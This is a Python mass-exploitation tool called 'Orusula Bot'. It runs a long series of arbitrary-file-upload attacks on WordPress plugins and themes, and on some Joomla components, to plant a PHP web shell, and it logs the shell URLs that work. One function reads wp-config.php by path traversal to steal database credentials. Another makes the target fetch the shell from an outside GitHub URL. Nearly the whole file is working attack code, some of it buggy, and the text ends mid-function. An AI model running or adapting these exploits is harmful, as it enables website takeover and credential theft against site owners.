#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import datetime
from random import choice
from bs4 import BeautifulSoup
import multiprocessing
import threading
import os
import platform
import time
import argparse
import re


#time
now = datetime.datetime.now()
year = now.strftime('%Y')
month = now.strftime('%m')
day = now.strftime('%d')
hour = now.strftime('%H')
minute = now.strftime('%M')
sec = now.strftime('%S')


# files paths
shell_php = "shells/Orusula.php"
shell_html = "shells/Orusula.html"
shell_jpg = "shells/Orusula.jpg"
shell_txt = "shells/Orusula.txt"
shell_zip = "shells/Orusula.zip"
shell_gif = "shells/Orusula.gif"

# files Names
name_php = "Orusula.php"
name_html = "Orusula.html"
name_jpg = "Orusula.jpg"
name_zip = "Orusula.zip"
name_txt = "Orusula.txt"
name_gif = "Orusula.gif"

#colors
RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"
YELLOW = '\033[33m'
HEADER = '\033[95m'


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
    "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01"
    ]

def version(cc):
    print("")
    print("%(prog)s ", cc)
    print("\n")
    print("{}[?] {}Source Code {}:{} http://github.com/BrahimJarrar/Orusula.git".format(HEADER, RED, YELLOW, BLUE))
    print("{}[?] {}Coded By    {}:{} Brahim Jarrar ".format(HEADER, RED, YELLOW, BLUE))
    print("{}[?] {}CopyRight, 2019{}".format(HEADER, RED, RESET))


class logo():
    banner = r"""{}

                                  |
                                \ | /
                                 \|/
  _________________________   ---({}0{})---   _________________________
  \__                      \___/~/|\~\___/                      __/
    \__                       / / | \ \                       __/
      \__                    /    |    \                    __/
        \___________________/           \___________________/
           \\\\\\\\\\\\\\\\/_____________\////////////////
                             /////|\\\\\

                 {} Orusula Bot           {}by {}@BrahimJarrar

                    {}Started {}:{} {} {} {} - {}:{}

    """.format(HEADER, RED, HEADER, BLUE, YELLOW, RED, GREEN, YELLOW, RESET, year, month, day, hour, minute)

    exit = r"""
    {}
                       .-.
        .-""`""-.    |(@ @)
     _/`oOoOoOoOo`\_ \ \-/
    '.-=-=-=-=-=-=-.' \/ \
      `-=.=-.-=.=-'    \ /\
         ^  ^  ^       _H_ \

                    {}Ended{} :{} {} {} {} - {}:{}

    """.format(RED, BLUE, YELLOW, RESET, year, month, day, hour, minute)

def save(url):
    f = open('Results/Goods.txt', 'a')
    f.write(url+"\n")
    f.close()

# add block
def addblockurl(target, headers):
    try:
        payload = {
            'popimg': open(shell_php, 'rb')
        }

        tr = target+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
        # sender

        requests.post(tr, files=payload, headers=headers, allow_redirects=False)

        new = target+'/wp-content/uploads/'+year+'/'+month+'/'+ name_php

        rr = requests.get(new, headers=headers, allow_redirects=False)

        if 'hacked' in rr.text:
            print (GREEN,"   [+] AddBlockUrl ", new)
            save(new)
        else:
            print (RED,"   [-] AddBlockUrl")
    except requests.exceptions.ConnectionError:
        print (RED,"   [-] AddBlockUrl")

# Wp blaze
def wp_blaze(target, headers):
    try:
        s = requests.session()
        payload = {
            'album_img':open(shell_php, 'rb'),
            'task':'blaze_add_new_album',
            'album_name':'',
            'album_desc':''
        }
        tr = target + "/wp-admin/admin.php?page=blaze_manage"

        content = s.post(tr,files=payload, data=payload, headers=headers, allow_redirects=False).text

        check_blaze = re.findall(r"\/uploads\/blaze\/(.*?)\/big\/Orusula.php", content)
        if check_blaze:
            uploadfolder = check_blaze.group(1)
            dump_data = target + "/wp-content/uploads/blaze/"+uploadfolder+"/big/Orusula.php"
            print (GREEN,'   [+] Blaze SlideShow ', dump_data)
            save(dump_data)

        else:
            print (RED,'   [-] Blaze SlideShow')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] Blaze SlideShow')

# wp Catpro
def wp_catpro(target, headers):
    try:
        s = requests.session()

        payload = {
            'album_img':open(shell_php,'rb'),
            'task':'cpr_add_new_album',
            'album_name':'',
            'album_desc':''
        }
        tr = target + "/wp-admin/admin.php?page=catpro_manage"
        content = s.post(tr, files=payload, data=payload, headers=headers, allow_redirects=False)
        content = content.text
        check_catpro = re.findall(r"\/uploads\/blaze\/(.*?)\/big\/Orusula.php", content)

        if check_catpro:
            path = check_catpro.group(1)
            dump_data = target + "/wp-content/uploads/catpro/"+path+"/big/"+name_php
            print (GREEN,'   [+] Catpro Plugin ', dump_data)
            save(dump_data)

        else:
            print (RED,'   [-] Catpro Plugin')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] Catpro Plugin')

# dream work gallery
def dreamworkgallery(target, headers):
    try:
        s = requests.session()

        tr = target + "/wp-admin/admin.php?page=dreamwork_manage"

        payload = {'album_img':open(shell_php, 'rb')}

        data = {
            'task':'drm_add_new_album',
            'album_name':'Arbitrary File Upload',
            'album_desc':'Arbitrary File Upload'
        }
        resp = s.post(tr, files=payload, data=data, headers=headers)

        text = resp.text

        if "Orusula" in text:
            try:
                text = text.split("public_html")
                result = target + text[-1]
                print(GREEN,"   [+] DreamWork ", result)
                save(result)
            except:
                print(RED,"   [-] DreamWork")
        else:
            print(RED,"   [-] DreamWork")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] DreamWork")

# FormCraft
def FormCraft(target, headers):
    try:
        payload = {
            "files[]": open(shell_txt,'rb')
        }
        bad = "ERROR" or "failed" or "Not allowed"
        tr = target + "/wp-content/plugins/formcraft/file-upload/server/content/upload.php"
        path = target + "/wp-content/plugins/formcraft/file-upload/server/content/files/"
        s = requests.session()
        r = s.post(tr, files=payload, headers=headers, allow_redirects=False)
        if r.status_code == 200:
            if bad in r.text:
                print("[-] FormCraft")
            else:
                if name_txt in r.text:
                    txt = r.text
                    txt = txt.split('"')
                    path = path + txt[9]
                    print(GREEN,"   [+] FormCraft ",path)
                    save(path)
                else:
                    print(RED,"   [-] FormCraft")
        else:
            print(RED,"   [-] FormCraft")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] FormCraft")

# Gravity
def Gravity(target, headers):
    try:
        s = requests.session()

        data = {
            'form_id':'../../../',
            'name':'Orusula.html',
            'gform_unique_id':'../../',
            'field_id':''
        }
        payload = {
            'file':open(shell_html, 'rb')
        }

        ep = target+"/?gf_page=upload"

        exploit = s.post(ep, headers=headers, files=payload, data=data)

        text = exploit.text

        if "Orusula.html" in text:
            filename = text.split('temp_filename":"')

            filename = payload[1]

            filename = filename.split('"')[0]

            print(GREEN,"   [+] Gravity Forms {}{}".format(target, filename))

            result = target+filename

            save(result)
        else:
            print(RED,"   [-] Gravity Forms")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Gravity Forms")

# Right Now
def RightNow(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php"

        shell = open(shell_php, 'rb')

        payload = {
            'Filedata':shell,
        }

        r = s.post(url, headers=headers, files=payload, data=payload, allow_redirects=False)

        r = r

        RightNow= target+"/wp-content/uploads/settingsimages/"+name_php

        rr = s.get(RightNow, headers=headers, allow_redirects=False)

        if "Hacked by Orusula" in rr.text and rr.status_code == 200:
            print(GREEN,"   [+] RightNow ", RightNow)
            save(RightNow)
        else:

            shell1 = open(shell_gif, 'rb')

            payload = {
                'Filedata':shell1
            }

            r = s.post(url, headers=headers, files=payload, data=payload)

            RightNow= target+"/wp-content/uploads/settingsimages/"+name_gif

            rr = s.get(RightNow, headers=headers, allow_redirects=False)

            if rr.status_code == 200 and "</script>" not in rr.text:
                print(GREEN,"   [+] RightNow ", RightNow)
                save(RightNow)
            else:
                print(RED,"   [-] RightNow ")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] RightNow ")

# job_manager
def job_manager(target, headers):
    try:
        s = requests.session()

        shell = open(shell_php, 'rb')

        payload = {
            "files":shell,
            "file[]":shell
        }
        tr = target + "/jm-ajax/upload_file/"
        try:
            conexao = s.get(tr, headers=headers, allow_redirects=False)
            falha = "error" or "not found"
            if "files" in conexao.text:
                injetar = requests.post(tr, files=payload, headers=headers, allow_redirects=False)
                if falha in injetar.text:
                    print(RED,"   [-] Job Manager")
                else:
                    shl = target + "/wp-content/uploads/job-manager-uploads/files/"+year+"/"+month+"/"+name_php
                    shell_dir = requests.get(shl, headers=headers, allow_redirects=False)
                    if shell_dir.status_code == 200:
                        print(GREEN,"   [+] Job Manager ", shl)
                        save(shl)
                    else:
                        print(RED,"   [-] Job Manager")
            else:
                print(RED,"   [-] Job Manager")
        except:
            print(RED,"   [-] Job Manager")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Job Manager")

# downloadsmanager
def downloadsmanager(target, headers):
    try:
        s = requests.session()

        payload = {
            "upfile" : open(shell_php, 'rb'),
            "dm_upload" : ""
        }

        data = {
            "dm_upload" : ""
        }
        scan = target+"/wp-content/plugins/downloads-manager/upload/"+name_php

        s.post(target, headers=headers, files=payload, data=data)

        rr = s.get(scan, headers=headers)

        if "Hackedby Orusula" in rr.text:
            print(GREEN,"   [+] downloadsmanager ", scan)
            save(scan)
        else:
            print(RED,"   [-] downloadsmanager ")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] downloadsmanager ")

# wp levoslideshow
def wp_levoslideshow(target,headers):
    try:
        endpoint = target + "/wp-admin/admin.php?page=levoslideshow_manage"
        shell = open(shell_php,'rb')
        options = {
                'album_img':shell,
                'task' : 'lvo_add_new_album',
                'album_name': '',
                'album_desk': '',
        }
        send_shell = requests.post(endpoint,options,headers).text
        check = re.findall("/uploads/levoslideshow/(.*?)/big/Orusula.php", send_shell)
        if check:
            dump_data = target + "/wp-content/uploads/levoslideshow/"+check.group(1)+"/big/"+name_php
            print (GREEN,'   [+] levoslideshow ', dump_data)
            save(dump_data)
        else:
            print (RED,'   [-] levoslideshow ')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] levoslideshow ')

# pinboard
def pinboard(target, headers):
    try:
        s = requests.session()

        pinboardup = {
            'Filedata':open(shell_php, 'rb')
        }

        s.post(target+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1', files=pinboardup, headers=headers)
        pinboardlib = s.get(target+'/wp-content/themes/pinboard/uploads/'+name_php, headers=headers, allow_redirects=False)
        if 'Hacked' in pinboardlib.text:
            dump = target,'/wp-content/themes/pinboard/uploads/'+name_php
            print(GREEN,"   [+] Pinboard ", dump)
            save(dump)
        else:
            print(RED,"   [-] Pinboard ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Pinboard ")

# pitchprint
def pitchprint(target, headers):
    try:
        s = requests.session()

        pitchprintup = {'files[]':open(shell_php, "rb")}

        s.post(target+'/wp-content/plugins/pitchprint/uploader/', files=pitchprintup, headers=headers, allow_redirects=False)

        path = target + "/wp-content/uploads/" + year + "/" + month + "/" + name_php
        req = s.get(path, headers=headers, allow_redirects=False)

        if 'Hacked' in req.text:
            print(GREEN,"   [+] pitchprint ", path)
            save(path)
        else:
            print(RED,"   [-] pitchprint")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] pitchprint")

# wp powerzoomer
def wp_powerzoomer(target, headers):
    try:
        s = requests.session()

        tr = target + "/wp-admin/admin.php?page=powerzoomer_manage"

        payload = {
                'album_img':open(shell_php,'rb'),
                'task':'pwz_add_new_album',
                'album_name':'',
                'album_desc':''
        }

        response = s.post(tr, files=payload, headers=headers, allow_redirects=False)
        response = response.text
        check_powerzoomer = re.findall(r"\/uploads\/powerzoomer\/(.*?)\/big\/Orusula.php", response)
        if check_powerzoomer:
            try:
                uploadfolder = check_powerzoomer.group(1)
                dump_data = target + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/"+name_php
                print (GREEN,'   [+] Powerzoomer ' +dump_data + ' ')
                save(dump_data)
            except ValueError:
                print (RED,'   [-] Powerzoomer')
        else:
            print (RED,'   [-] Powerzoomer')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] Powerzoomer')

# Revslider Ajax
def Revslider_Ajax(target, headers):
    try:
        data = {
            'action':'revslider_ajax_action',
            'client_action':'update_plugin'
        }
        tr = "/wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php"
        try:
            rp1 = requests.get(target+tr, headers=headers, allow_redirects=False)
            a = rp1.text
            if "define(" in a:
                for item in a.split("\n"):
                    if """define('""" in item:
                        data = item.strip()
                        data = data[7:-2].replace("'", "").split(",")
                        if "DB_NAME" == data[0]:
                            DB_NAME = data[1]
                        elif "DB_USER" == data[0]:
                            DB_USER = data[1]
                        elif "DB_PASSWORD" == data[0]:
                            DB_PASSWORD = data[1]
                            print(GREEN,"   [+] Revslider Ajax = db_name:{}  db_username:{}  db_Pwd:{} ".format(DB_NAME,DB_USER,DB_PASSWORD))
                            result = target+" = db_name:{}  db_username:{}  db_Pwd:{} ".format(DB_NAME,DB_USER,DB_PASSWORD)
                            save(result)
                        else:
                            pass
                    else:
                        print(RED,"   [-] Revslider Ajax")
            else:
                print(RED,"   [-] Revslider Ajax")
        except:
            print(RED,"   [-] Revslider Ajax")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Revslider Ajax")

# Revslider
def Revslider(target, headers):
    try:
        payload = {
            'update_file':open(shell_php, "rb")
        }
        data = {
            'action':'revslider_ajax_action',
            'client_action':'update_plugin'
        }
        asu = ("/wp-content/revslider/temp/update_extract/revslider/")
        exploit = target+'/wp-admin/admin-ajax.php'
        s = requests.session()
        exploit = s.post(exploit, headers=headers, files=payload, data=data)
        checker = s.get(target+asu+name_php, headers=headers, allow_redirects=False)
        url = (target+asu+shell_php)
        if checker.status_code == 200 and 'Hacked' in checker.text:
            print(GREEN,"   [+] Revslider {}" .format(url))
            save(url)
        else:
            print (RED,"   [-] Revslider")
    except requests.exceptions.ConnectionError:
        print (RED,"   [-] Revslider")

# High Revslider Attack
def max_revslider(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-admin/admin-ajax.php"

        r = s.get(url, headers=headers, allow_redirects=False)

        if r.status_code == 200:
            shell = open(shell_zip, "rb")

            payload = {
                'update_file':shell
            }

            data = {
                'action':'revslider_ajax_action',
                'client_action':'update_plugin'
            }

            r = s.post(url, headers=headers, data=data, files=payload)

            url0 = target+"/wp-content/plugins/revslider/temp/update_extract/revslider/"+name_php
            url1 = target+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url2 = target+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url3 = target+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url4 = target+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/"+name_php
            url5 = target+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/"+name_php
            url6 = target+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/"+name_php
            url7 = target+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/"+name_php
            url8 = target+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url9 =  target+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/"+name_php
            url10 = target+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url11 = target+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/"+name_php
            url12 = target+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/"+name_php

            url0 = s.get(url0, headers=headers, allow_redirects=False, timeout=1)
            url1 = s.get(url1, headers=headers, allow_redirects=False)
            url2 = s.get(url2, headers=headers, allow_redirects=False)
            url3 = s.get(url3, headers=headers, allow_redirects=False)
            url4 = s.get(url4, headers=headers, allow_redirects=False)
            url5 = s.get(url5, headers=headers, allow_redirects=False)
            url6 = s.get(url6, headers=headers, allow_redirects=False)
            url7 = s.get(url7, headers=headers, allow_redirects=False)
            url8 = s.get(url8, headers=headers, allow_redirects=False)
            url9 = s.get(url9, headers=headers, allow_redirects=False)
            url10 = s.get(url10, headers=headers, allow_redirects=False)
            url11 = s.get(url11, headers=headers, allow_redirects=False)
            url12 = s.get(url12, headers=headers, allow_redirects=False)

            if 'Hacked' in url0.text and url0.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url0)
                save(url0)

            elif 'Hacked' in url1.text and url1.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url1)
                save(url1)

            elif 'Hacked' in url2.text and url2.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url2)
                save(url2)

            elif 'Hacked' in url3.text and url3.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url3)
                save(url3)

            elif 'Hacked' in url4.text and url4.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url4)
                save(url4)

            elif 'Hacked' in url5.text and url5.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url5)
                save(url5)

            elif 'Hacked' in url6.text and url6.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url6)
                save(url6)

            elif 'Hacked' in url7.text and url7.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url7)
                save(url7)

            elif 'Hacked' in url8.text and url8.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url8)
                save(url8)

            elif 'Hacked' in url9.text and url9.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url9)
                save(url9)

            elif 'Hacked' in url10.text and url10.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url10)
                save(url10)

            elif 'Hacked' in url11.text and url11.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url11)
                save(url11)

            elif 'Hacked' in url12.text and url12.status_code != 404:
                print(GREEN,"   [+] Revslider Max ", url12)
                save(url12)

            else:
                print (RED,"   [-] Revslider Max")

        else:
            print (RED,"   [-] Revslider Max 404")
    except requests.exceptions.ConnectionError:
        print (RED,"   [-] Revslider Max Error")
    except requests.exceptions.ReadTimeout:
        print (RED,"   [-] Revslider Max timeout")

# dzs zoom sounds
def dzs_zoomsounds(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-content/plugins/dzs-zoomsounds/admin/upload.php"

        dzsup = target+"/wp-content/plugins/dzs-zoomsounds/admin/upload/"+name_php

        shell = open(shell_zip, "rb")

        payload = {
            'file_field':shell
        }

        dzsres = s.post(url, headers=headers, files=payload)

        dzsres = dzsres # xD

        time.sleep(0.1)

        rr = s.get(dzsup, headers=headers, allow_redirects=False)

        if rr.status_code == 200 and 'Orusula' in rr.text and 'Hacked' in rr.text:
            print(GREEN,"   [-] dzs zoomsounds", dzsup)
            save(dzsup)
        else:
            print(RED,"   [-] dzs zoomsounds")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] dzs zoomsounds")

# Cherry Plugin
def Cherry_Plugin(target, headers):
    try:
        s = requests.session()

        shell = open(shell_php, "rb")

        url = target+"/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"

        payload = {
            'file':shell
        }

        r = s.post(url, headers=headers, files=payload, allow_redirects=False)

        r = r

        cherryup = target+"/wp-content/plugins/cherry-plugin/admin/import-export/"+name_php

        rr = s.get(cherryup, headers=headers, allow_redirects=False)

        if rr.status_code == 200 and 'Hacked by Orusula' in rr.text:
            print(GREEN,"   [+] Cherry Plugin ", cherryup)
            save(cherryup)
        else:
            print (RED,"   [-] Cherry Plugin")

    except requests.exceptions.ConnectionError:
        print (RED,"   [-] Cherry Plugin")

# wtffu
def wtffu(target, headers):
    try:

        s = requests.session()

        url = target+"/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php"
        shell = open(shell_php, "rb")

        payload = {
            'files[]':shell
        }

        r = s.post(url, headers=headers, files=payload)

        r = r

        wtffup = target+"/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/"+name_php

        rr = s.get(wtffup, headers=headers, allow_redirects=False)

        if 'Hacked' in rr.text:
            print(GREEN,"   [+] wtff ", wtffup)
            save(wtffup)
        else:
            print (RED,"   [-] wtff")
    except requests.exceptions.ConnectionError:
        print (RED,"   [-] wtff")

# woocommerce img
def woocommerce_img(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-content/plugins/woocommerce-product-options/includes/image-upload.php"

        rr = s.get(url, headers=headers, allow_redirects=False)

        if "woocommerce_product_options_image_upload" in rr.text and rr.status_code == 200:
            print(GREEN,"   [+] woocommerce img ", url)
            save(url)
        else:
            print (RED,"   [-] woocommerce img ")
    except requests.exceptions.ConnectionError:
        print (RED,"   [-] woocommerce img")

# Simple ads manager
def Simple_ads_manager(target, headers):
    try:

        s = requests.session()

        url = target+"/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"

        shell = open(shell_php, "rb")

        payload = {
            'uploadfile':shell
        }

        data = {
            'uploadfile':shell,
            'action' : 'upload_ad_image',
            'path' : ''
        }

        r = s.post(url, headers=headers, files=payload, data=data)

        if '{"status":"success"}' in r.text and r.status_code != 404:
            sam = target+"/wp-content/plugins/simple-ads-manager/"+name_php
            print(GREEN,"   [+] Simple ads manager ", sam)
            save(sam)
        else:
            print(RED,"   [-] Simple ads manager ")

    except requests.exceptions.ConnectionError:
        print (RED,"   [-] Simple ads manager")

# satoshi
def satoshi(target, headers):
    try:
        satoshiup = {
            'Filedata':open(shell_php, "rb")
        }

        requests.post(target+'/wp-content/themes/satoshi/functions/upload-handler.php', files=satoshiup, headers=headers)

        path = target + "/wp-content/satoshi/images/" + name_php

        satoshilib = requests.get(target+'/wp-content/satoshi/images/'+name_php, headers=headers, allow_redirects=False)

        if 'Hacked by Orusula' in satoshilib.text and satoshilib.status_code == 200:
            print(GREEN,"   [+] Satoshi ", path)
            save(path)
        else:
            print(RED,"   [-] Satoshi ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Satoshi ")

# wp showbiz
def wp_showbiz(target,headers):
    try:
        endpoint = target + "/wp-admin/admin-ajax.php"
        payload = {
                    "action":"showbiz_ajax_action",
                    "client_action":"update_plugin",
                    "update_file":open(shell_php,'rb')
                }
        requests.post(endpoint,files=payload,data=payload,headers=headers, allow_redirects=False)

        dump_data = target + "/wp-content/plugins/showbiz/temp/update_extract/"+name_php
        res=requests.get(dump_data, headers=headers, allow_redirects=False)
        if "hacked" in res.text:
            print (GREEN,'   [+] Showbiz Pro ', dump_data)
            save(dump_data)
        else:
            print (RED,'   [-] Showbiz Pro')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] Showbiz Pro')

# WP Mobile Detector
def WP_MOBILE_Detector(target,headers):
    try:

        s = requests.session()

        shell = "https://raw.githubusercontent.com/BrahimJarrar/Orusula/master/shells/Orusula.php"
        url = target+"/wp-content/plugins/wp-mobile-detector/resize.php?src="+shell
        wpmdup = target+"/wp-content/plugins/wp-mobile-detector/cache/"+name_php

        get = s.get(url, headers=headers, allow_redirects=False)
        get = get

        post = s.post(url, headers=headers, allow_redirects=False)
        post = post

        scan = s.get(wpmdup, headers=headers, allow_redirects=False)

        if 'Hacked by Orusula' in scan.text and scan.status_code == 200:
            print (GREEN,'   [+] WP Mobile Detector ', wpmdup)
            save(wpmdup)
        else:
            print (RED,'   [-] WP Mobile Detector ')
    except requests.exceptions.ConnectionError:
        print (RED,'   [-] WP Mobile Detector ')

# barclaycart
def barclaycart(target, headers):
    try:
        s = requests.session()

        url = target+"/wp-content/plugins/barclaycart/uploadify/uploadify.php"

        shell = open(shell_php,'rb')

        payload = {
            'Filedata':shell
        }

        r = s.post(url, headers=headers, files=payload)

        r = r

        path = target+"/wp-content/plugins/barclaycart/uploadify/"+name_php
        rr = s.get(path, headers=headers, allow_redirects=False)

        if "Hacked" in rr.text:

            print(GREEN,"   [+] barclaycart ", path)
            save(path)
        else:
            print(RED,"   [-] barclaycart")

    except requests.exceptions.ConnectionError:
        print(RED,"   [-] barclaycart")

# synoptic
def synoptic(target, headers):
    try:
        s = requests.session()

        payload = {
            'qqfile':open(shell_php, 'rb')
        }

        tr = target+"/wp-content/themes/synoptic/lib/avatarupload/upload.php"

        exploit = s.post(tr, headers=headers, files=payload, allow_redirects=False)

        exploit = exploit.text

        path = target+"/wp-content/uploads/markets/avatars/"+name_php

        check = s.get(path, headers=headers, allow_redirects=False)

        text = check.text

        if "Hacked by" in text:

            print(GREEN,"   [+] synoptic ", path)
            save(path)
        else:
            print(RED,"   [-] synoptic")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] barclaycart")

# wysija
def wysija(target, headers):
    try:
        s = requests.session()

        Wysijaup = {
            'my-theme':open(shell_zip, 'rb')
        }

        Wysijaapp = {
            'action':'themeupload',
            'submitter':'Upload',
            'overwriteexistingtheme':'on',
            'page':'GZNeFLoZAb'
        }

        url = target+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes'

        rr = s.post(url, data=Wysijaapp, files=Wysijaup, headers=headers)

        rr = rr

        scan = target+'/wp-content/uploads/wysija/themes/Orusula/'+name_php
        Wysijalib = requests.get(scan, headers=headers, allow_redirects=False)

        if 'Hacked' in Wysijalib.text:
            print(GREEN,"   [+] Wysija ",scan)
            save(scan)

        else:
            print(RED,"   [-] Wysija ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] Wysija ")


### Joomla exploits ###

# com_adsmanager
def com_adsmanager(target, headers):
    try:
        s = requests.session()

        endpoint = target+"/index.php?option=com_adsmanager&task=upload&tmpl=component"
        img = open(shell_gif, 'rb')
        files= {'image': img}

        s.post(endpoint, files=files, headers=headers)

        shellup = target + "/tmp/plupload/"+name_gif

        checkShell = s.get(shellup, headers=headers, allow_redirects=False)


        if checkShell.status_code == 200:
            print(GREEN,"   [+] com_adsmanager ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_adsmanager ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_adsmanager ")

# com blog
def com_blog(target, headers):
    try:
        s = requests.session()
        endpoint = target + "/index.php?option=com_myblog&task=ajaxupload"
        checkShell = s.get(endpoint, headers=headers).text
        statusCheck = re.findall(re.compile(r'has been uploaded'), checkShell)
        if statusCheck:
            print(GREEN,"   [+] com_blog ", endpoint)
            save(endpoint)
        else:
            print(RED,"   [-] com_blog ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_blog ")

# com extplorer
def com_extplorer(target,headers):
    try:
        s = requests.session()

        endpoint = target + "/administrator/components/com_extplorer/uploadhandler.php"

        img = open(shell_gif, 'rb')

        fieldname = "Filedata"
        files= {
            'image': img
            }
        data = {
            fieldname : files
            }

        s.post(endpoint, data=data, headers=headers, files=files)
        shellup = target + "/images/stories/"+name_gif
        checkShell = requests.get(shellup, headers=headers, allow_redirects=False)

        statusCheck = re.findall(re.compile(r'Orusula'),checkShell.text)

        statusCheck = statusCheck

        if checkShell.status_code == 200:
            print(GREEN,"   [+] com_extplorer ", shellup)
            save(shellup)
        else:
            print(RED,"   [-] com_extplorer ")
    except requests.exceptions.ConnectionError:
        print(RED,"   [-] com_extplorer ")

# com fabrike
def com_fabrike(target, headers):
    try:
        s = requests.session()

        shell = open(shell_php, "rb")

        url = target+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

        files = {
            "file":shell
        }

        headers = {
            'User-Agent' : "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
            'Content_Type' : 'multipart/form-data',
            'Connection': 'keep-alive',
        }

        data = {
            "f_url":"",
            "f_alt":"",
            "f_title":"",
            "f_caption":"",
            "dirPath":"",
